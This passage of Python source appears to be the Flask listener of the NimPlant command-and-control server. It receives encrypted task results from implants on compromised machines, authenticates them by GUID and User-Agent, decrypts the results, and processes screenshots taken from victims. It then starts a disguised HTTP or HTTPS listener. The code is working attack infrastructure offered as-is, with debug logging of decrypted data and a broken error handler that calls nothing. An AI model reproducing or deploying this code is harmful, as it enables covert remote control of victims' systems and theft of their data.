        utils.nimplant_print(f"DEBUG: [ROUTE ACTIVATED] result_path: {flask.request.method} {resultPath} from {get_external_ip(flask.request)}")
        utils.nimplant_print(f"DEBUG: Complete headers: {dict(flask.request.headers)}")
        
        if not flask.request.is_json:
            utils.nimplant_print(f"DEBUG: ERROR - Request does not contain valid JSON")
            return flask.jsonify(status="Not found"), 404
            
        utils.nimplant_print(f"DEBUG: JSON body: {flask.request.json}")
        
        request_id = flask.request.headers.get("X-Request-ID", "NO_ID")
        agent_header = flask.request.headers.get("User-Agent")
        
        utils.nimplant_print(f"DEBUG: Verifying headers - X-Request-ID: '{request_id}'")
        utils.nimplant_print(f"DEBUG: Verifying headers - User-Agent: '{agent_header}' (expected: '{user_agent}')")
        
        data = flask.request.json
        np: NimPlant = np_server.get_nimplant_by_guid(request_id)
        
        if np is not None:
            utils.nimplant_print(f"DEBUG: Implant found: {np.guid}")
            
            if user_agent == agent_header:
                utils.nimplant_print(f"DEBUG: Valid User-Agent")
                
                try:
                    if "data" not in data:
                        utils.nimplant_print(f"DEBUG: ERROR - JSON does not contain 'data' field")
                        return flask.jsonify(status="Not found"), 404
                        
                    encrypted_data = data["data"]
                    utils.nimplant_print(f"DEBUG: Encrypted data received (length: {len(encrypted_data) if encrypted_data else 0})")
                    
                    utils.nimplant_print(f"DEBUG: Decrypting data...")
                    decrypted_data = decrypt_data(encrypted_data, np.encryption_key)
                    utils.nimplant_print(f"DEBUG: Decrypted data: {decrypted_data}")
                    
                    res = json.loads(decrypted_data)
                    utils.nimplant_print(f"DEBUG: Parsed JSON: {res}")
                    
                    if "guid" not in res or "result" not in res:
                        utils.nimplant_print(f"DEBUG: ERROR - JSON does not contain required fields 'guid' and/or 'result'")
                        return flask.jsonify(status="Not found"), 404
                    
                    task_guid = res["guid"]
                    result_data = decode_base64_blob(res["result"])
                    
                    utils.nimplant_print(f"DEBUG: Task GUID: {task_guid}")
                    utils.nimplant_print(f"DEBUG: Decoded result (first 50 chars): {result_data[:50]}...")

                    # Handle Base64-encoded, gzipped PNG file (screenshot)
                    if result_data.startswith("H4sIAAAA") or result_data.startswith("H4sICAAA"):
                        utils.nimplant_print(f"DEBUG: Detected result as screenshot, processing...")
                        result_data = commands.process_screenshot(np, result_data)

                    utils.nimplant_print(f"DEBUG: Setting result for task {task_guid}")
                    utils.nimplant_print(f"DEBUG: Task result: {result_data}")
                    np.set_task_result(task_guid, result_data)
                    return flask.jsonify(status="OK"), 200
                except Exception as e:
                    utils.nimplant_print(f"DEBUG: ERROR processing result: {str(e)}")
                    utils.nimplant_print(f"DEBUG: Exception type: {type(e).__name__}")
                    return flask.jsonify(status="Not found"), 404
            else:
                utils.nimplant_print(f"DEBUG: ERROR - Incorrect User-Agent: '{agent_header}'")
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            utils.nimplant_print(f"DEBUG: ERROR - Implant with ID not found: {request_id}")
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.errorhandler(Exception)
    def all_exception_handler(error):
        utils.nimplant_print(f"DEBUG: [ERROR HANDLER] Unhandled exception: {type(error).__name__} - {str(error)}")
        utils.nimplant_print

    @app.after_request
    def change_server_and_add_cors(response: flask.Response):
        # Add custom Server header
        response.headers["Server"] = ident
        
        # Add CORS headers
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type,Authorization,X-Request-ID,X-Correlation-ID,User-Agent,Content-MD5'
        response.headers.add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
        return response

    # Print all available routes AFTER registering them
    utils.nimplant_print(f"DEBUG: All registered routes:")
    for rule in app.url_map.iter_rules():
        utils.nimplant_print(f"DEBUG:   {rule.endpoint} => {rule.rule} [{', '.join(rule.methods)}]")

    # Run the Flask web server using Gevent
    if listener_type == "HTTP":
        try:
            utils.nimplant_print(f"DEBUG: Starting HTTP server on {server_ip}:{listener_port}")
            http_server = WSGIServer((server_ip, listener_port), app, log=None)
            http_server.serve_forever()
        except Exception as e:
            utils.nimplant_print(
                f"ERROR: Error setting up web server. Verify listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
    else:
        try:
            utils.nimplant_print(f"DEBUG: Starting HTTPS server on {server_ip}:{listener_port}")
            https_server = WSGIServer(
                (server_ip, listener_port),
                app,
                keyfile=ssl_key_path,
                certfile=ssl_cert_path,
                ssl_version=PROTOCOL_TLSv1_2,
                cert_reqs=CERT_NONE,
                log=None,
            )
            https_server.serve_forever()
        except Exception as e:
            utils.nimplant_print(
                f"ERROR: Error setting up SSL web server. Verify 'sslCertPath', 'sslKeyPath', and listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
